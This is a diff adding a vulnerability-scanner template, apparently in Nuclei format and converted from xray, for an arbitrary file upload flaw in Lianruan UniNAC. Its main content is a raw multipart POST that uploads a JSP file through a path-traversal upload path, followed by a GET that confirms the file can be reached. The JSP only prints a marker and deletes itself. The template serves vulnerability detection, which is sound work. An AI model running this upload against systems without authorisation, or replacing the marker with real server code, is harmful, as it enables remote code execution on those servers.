@@ -1,0 +1,44 @@
+id: poc-yaml-lianruan-uninac-fileupload
+
+info:
+  name: poc-yaml-lianruan-uninac-fileupload
+  author: Aurora
+  severity: high
+  tags: xray-converted,fileupload,ct-474109
+  reference:
+    - https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/%E8%81%94%E8%BD%AF%E7%A7%91%E6%8A%80/%E8%81%94%E8%BD%AF%E5%87%86%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/
+
+http:
+  - raw:
+      - |
+        POST /uai/download/uploadfileToPath.htm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{rand_base(8)}}
+
+        --{{rand_base(8)}}
+        Content-Disposition: form-data; name="input_localfile"; filename="{{rand_base(8)}}.jsp"
+        Content-Type: text/plain
+        
+        <%out.print("{{rand_base(8)}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --{{rand_base(8)}}
+        Content-Disposition: form-data; name="uploadpath";
+        
+        ../webapps/notifymsg/devreport/
+        --{{rand_base(8)}}--
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /notifymsg/devreport/{{rand_base(8)}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
